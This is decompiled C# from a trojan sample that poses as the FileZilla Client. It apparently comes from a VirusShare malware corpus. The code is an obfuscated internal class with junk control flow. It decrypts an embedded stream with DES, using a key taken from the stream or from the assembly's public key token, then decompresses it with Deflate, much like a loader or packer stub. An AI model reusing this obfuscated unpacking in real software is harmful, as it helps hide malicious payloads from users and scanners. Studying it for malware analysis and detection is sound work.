// Decompiled with JetBrains decompiler
// Type: .
// Assembly: FileZilla Client, Version=3.5.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B794D7B0-77D8-4DB9-A117-32697E11C530
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Llac.coih-d4a46fe8e815224c23e37613278718e055c3b6df9e98f5bf6e3c86f949db54e3.exe

using \u0002;
using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;

namespace \u0002
{
  internal class \u0003
  {
    private static readonly object \u0001;
    private static readonly int \u0001;
    private static readonly int \u0002;
    private static readonly MemoryStream \u0001 = (MemoryStream) null;
    private static readonly MemoryStream \u0002;

    static \u0003()
    {
label_1:
      \u0003.\u0002 = (MemoryStream) null;
      int capacity = int.MaxValue;
      do
      {
        if (capacity != 0)
        {
          \u0003.\u0001 = capacity;
          \u0003.\u0002 = int.MinValue;
          if (true)
          {
            \u0003.\u0001 = new MemoryStream(0);
            if (true)
              capacity = 0;
            else
              goto label_1;
          }
          else
            goto label_7;
        }
      }
      while (capacity != 0);
      goto label_8;
label_7:
      return;
label_8:
      \u0003.\u0002 = new MemoryStream(capacity);
      \u0003.\u0001 = new object();
    }

    private static string \u0001(Assembly cee032ce5bac4a45bae3ca1459d69e02f)
    {
      string str = cee032ce5bac4a45bae3ca1459d69e02f.FullName;
      int num1 = str.IndexOf(',');
      int length;
      while (true)
      {
        if (true)
          goto label_14;
label_4:
        if (true)
        {
          int num2 = 0;
          if (num2 != 0)
          {
            num1 = num2;
            continue;
          }
          if (num1 < num2)
            goto label_13;
          else
            goto label_7;
        }
        else
          break;
label_14:
        length = num1;
        num1 = length;
        goto label_4;
      }
      goto label_8;
label_7:
      num1 = 5;
label_8:
      if (num1 != 0)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          default:
            num1 = 1;
            break;
        }
      }
      if (num1 == 0)
      {
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0001);
      }
      str = str.Substring(0, length);
label_13:
      return str;
    }

    private static byte[] \u0001(Assembly cee032ce5bac4a45bae3ca1459d69e02f)
    {
      byte[] numArray;
      try
      {
        string fullName = cee032ce5bac4a45bae3ca1459d69e02f.FullName;
label_16:
        int num1 = fullName.IndexOf("PublicKeyToken=");
        if (false)
          goto label_12;
        else
          goto label_17;
label_1:
        if (true)
        {
          switch (5)
          {
            case 0:
              goto label_1;
            default:
              if (true)
                goto label_18;
              else
                break;
          }
        }
        else
          goto label_16;
label_4:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0001);
        goto label_18;
label_5:
        int num2;
        int num3;
        if (num1 < num3)
        {
label_6:
          switch (1)
          {
            case 0:
              goto label_6;
            default:
              if (true)
              {
                if (true)
                {
                  numArray = (byte[]) null;
                  goto label_22;
                }
                else
                  goto label_1;
              }
              else
                goto label_4;
          }
        }
        else
        {
          num2 += 15;
          if (fullName[num2] != 'n')
            num1 = (int) fullName[num2];
          else
            goto label_14;
        }
label_12:
        num3 = 78;
        if (num3 != 0)
        {
          if (num1 != num3)
          {
            byte[] bytes = BitConverter.GetBytes(long.Parse(fullName.Substring(num2, 16), NumberStyles.HexNumber));
            Array.Reverse((Array) bytes);
            numArray = bytes;
            goto label_22;
          }
        }
        else
          goto label_5;
label_14:
        numArray = (byte[]) null;
        goto label_22;
label_17:
        num2 = num1;
        if (num2 >= 0)
          goto label_19;
        else
          goto label_1;
label_18:
        num2 = fullName.IndexOf("publickeytoken=");
label_19:
        int num4 = num2;
        num3 = 0;
        num1 = num4;
        goto label_5;
      }
      catch
      {
      }
label_21:
      return (byte[]) null;
label_22:
      if (true)
        return numArray;
      goto label_21;
    }

    internal static unsafe byte[] \u0001(Stream cadcb57d6309cf8bd2529e961287d6bab)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(14);
      object obj1 = \u0003.\u0001;
      object obj2;
      if (true)
        obj2 = obj1;
      Monitor.Enter(obj1);
      byte[] numArray1;
      try
      {
        Stream stream = cadcb57d6309cf8bd2529e961287d6bab;
        MemoryStream memoryStream = (MemoryStream) null;
        int length = cadcb57d6309cf8bd2529e961287d6bab.ReadByte();
        int num1;
        if (true)
          num1 = (int) ~(ushort) length;
        else
          goto label_23;
label_3:
        ushort num2 = (ushort) num1;
        ICryptoTransform decryptor;
        byte[] numArray2;
        if (((int) num2 & 2) != 0)
        {
          DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
          byte[] buffer1 = new byte[8];
          if (true)
          {
            cadcb57d6309cf8bd2529e961287d6bab.Read(buffer1, 0, 8);
            cryptoServiceProvider.IV = buffer1;
            byte[] buffer2 = new byte[8];
            cadcb57d6309cf8bd2529e961287d6bab.Read(buffer2, 0, 8);
            *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
            byte[] numArray3 = buffer2;
            *(int*) ((IntPtr) voidPtr + 8) = 0;
            while (*(int*) ((IntPtr) voidPtr + 8) < numArray3.Length)
            {
              *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) numArray3[*(int*) ((IntPtr) voidPtr + 8)];
              if (*(byte*) ((IntPtr) voidPtr + 13) != (byte) 0)
              {
                while (true)
                {
                  switch (2)
                  {
                    case 0:
                      continue;
                    default:
                      if (false)
                      {
                        // ISSUE: method reference
                        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0003.\u0001);
                      }
                      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                      goto label_15;
                  }
                }
                goto label_48;
              }
              else
                *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
            }
label_14:
            switch (4)
            {
              case 0:
                goto label_14;
            }
label_15:
            if (*(sbyte*) ((IntPtr) voidPtr + 12) != (sbyte) 0)
              buffer2 = \u0003.\u0001(Assembly.GetExecutingAssembly());
            cryptoServiceProvider.Key = buffer2;
            if (\u0003.\u0001 == null)
            {
              if (\u0003.\u0001 == int.MaxValue)
              {
label_19:
                switch (1)
                {
                  case 0:
                    goto label_19;
                  default:
                    \u0003.\u0001.Capacity = (int) cadcb57d6309cf8bd2529e961287d6bab.Length;
                    break;
                }
              }
              else
                \u0003.\u0001.Capacity = \u0003.\u0001;
            }
            \u0003.\u0001.Position = 0L;
            decryptor = cryptoServiceProvider.CreateDecryptor();
            *(int*) voidPtr = decryptor.InputBlockSize;
            int outputBlockSize = decryptor.OutputBlockSize;
            numArray2 = new byte[decryptor.OutputBlockSize];
            length = length = decryptor.InputBlockSize;
          }
          else
            goto label_44;
        }
        else
          goto label_29;
label_23:
        byte[] numArray4 = new byte[length];
        int position;
        for (position = (int) cadcb57d6309cf8bd2529e961287d6bab.Position; (long) (position + *(int*) voidPtr) < cadcb57d6309cf8bd2529e961287d6bab.Length; position += *(int*) voidPtr)
        {
          cadcb57d6309cf8bd2529e961287d6bab.Read(numArray4, 0, *(int*) voidPtr);
          int count = decryptor.TransformBlock(numArray4, 0, *(int*) voidPtr, numArray2, 0);
          \u0003.\u0001.Write(numArray2, 0, count);
        }
label_26:
        num1 = 2;
        if (num1 != 0)
        {
          switch (num1)
          {
            case 0:
              goto label_26;
            default:
              cadcb57d6309cf8bd2529e961287d6bab.Read(numArray4, 0, (int) (cadcb57d6309cf8bd2529e961287d6bab.Length - (long) position));
              byte[] buffer3 = decryptor.TransformFinalBlock(numArray4, 0, (int) (cadcb57d6309cf8bd2529e961287d6bab.Length - (long) position));
              \u0003.\u0001.Write(buffer3, 0, buffer3.Length);
              stream = (Stream) \u0003.\u0001;
              stream.Position = 0L;
              memoryStream = \u0003.\u0001;
              break;
          }
        }
        else
          goto label_3;
label_29:
        if (((int) num2 & 8) != 0)
        {
          try
          {
            if (\u0003.\u0002 == null)
            {
label_31:
              switch (7)
              {
                case 0:
                  goto label_31;
                default:
                  if (\u0003.\u0002 == int.MinValue)
                  {
label_33:
                    switch (2)
                    {
                      case 0:
                        goto label_33;
                      default:
                        \u0003.\u0002.Capacity = (int) stream.Length * 2;
                        break;
                    }
                  }
                  else
                  {
                    \u0003.\u0002.Capacity = \u0003.\u0002;
                    break;
                  }
                  break;
              }
            }
            \u0003.\u0002.Position = 0L;
            if (true)
            {
              DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
              *(int*) ((IntPtr) voidPtr + 4) = 1000;
              byte[] buffer4 = new byte[*(int*) ((IntPtr) voidPtr + 4)];
              int count;
              do
              {
                count = deflateStream.Read(buffer4, 0, *(int*) ((IntPtr) voidPtr + 4));
                if (count > 0)
                {
label_39:
                  switch (3)
                  {
                    case 0:
                      goto label_39;
                    default:
                      \u0003.\u0002.Write(buffer4, 0, count);
                      break;
                  }
                }
              }
              while (count >= *(int*) ((IntPtr) voidPtr + 4));
            }
            memoryStream = \u0003.\u0002;
          }
          catch (Exception ex)
          {
          }
        }
label_44:
        if (memoryStream != null)
        {
label_45:
          switch (2)
          {
            case 0:
              goto label_45;
          }
        }
        else
        {
          byte[] buffer5 = new byte[cadcb57d6309cf8bd2529e961287d6bab.Length - cadcb57d6309cf8bd2529e961287d6bab.Position];
          cadcb57d6309cf8bd2529e961287d6bab.Read(buffer5, 0, buffer5.Length);
          numArray1 = buffer5;
          goto label_48;
        }
label_46:
        numArray1 = memoryStream.ToArray();
        goto label_50;
label_48:
        if (false)
          goto label_46;
      }
      finally
      {
        Monitor.Exit(obj2);
      }
label_50:
      return numArray1;
    }
  }
}
